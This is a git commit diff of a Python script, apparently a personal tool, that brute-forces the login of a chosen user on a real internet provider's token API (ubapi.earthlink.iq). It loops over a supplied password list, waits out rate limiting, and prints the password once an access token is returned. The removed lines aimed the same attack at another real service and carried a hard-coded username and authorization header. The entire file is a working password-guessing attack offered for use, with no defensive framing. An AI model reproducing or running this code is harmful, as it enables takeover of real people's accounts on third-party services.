5552c231b80cec0f70caa0f47757f1bdc15af585
mustafa-ahsan <44897579+mustafa-ahsan@users.noreply.github.com>
2022-03-15 19:32:26 -0400

    Update test.py

--- test.py
+++ test.py
@@ -1,29 +1,38 @@
 import requests
 import time
 import os
-passinpot = open('test.txt', 'r').readlines()
+
+u = input("Enter User for attack: ")
+listpas = input("Enter password list: ")
+userLIST = []
+usernameLIST = []
+passinpot = open(listpas, 'r').readlines()
 for line in passinpot:
   a = line.strip()
-  headers = {
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
-    'Accept': 'application/json, text/plain, */*',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Authorization': 'Basic TmV3LkNpbmVtYW5hLmlkOlBAc3N3b3Jk',
-    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-    'Origin': 'https://cinemana.shabakaty.com',
-    'Connection': 'keep-alive',
-    'Referer': 'https://cinemana.shabakaty.com/landing',
-}
+
+
   data = {
   'grant_type': 'password',
-  'scope': 'openid earthlink.profile offline_access fileservice',
-  'username': 'mustafakmal',
-  'password': a
-}
-  http = requests.post('https://account.shabakaty.com/core/connect/token/', headers=headers, data=data)
+  'username': u,
+  'password': a,
+  'Logintype': '0'
+  }
+
+  http = requests.post('https://ubapi.earthlink.iq/api/user/Token', data=data)
+
   print(http.text)
-  if 'invalid_username_or_password' in http.text:
-     print('error')
+  if 'Too many !' in http.text:
+     
+     print("loading ... .>>>^^^^^^")
+     time.sleep(100)
+     print(a)
   if 'access_token' in http.text:
-      print(a)
-      break
+      os.system("clear")
+      userLIST.append(u)
+      print("USER FUONDD  ",userLIST, "and PASS","[",a,"]")
+      exit(1)
+
+
+
+
+
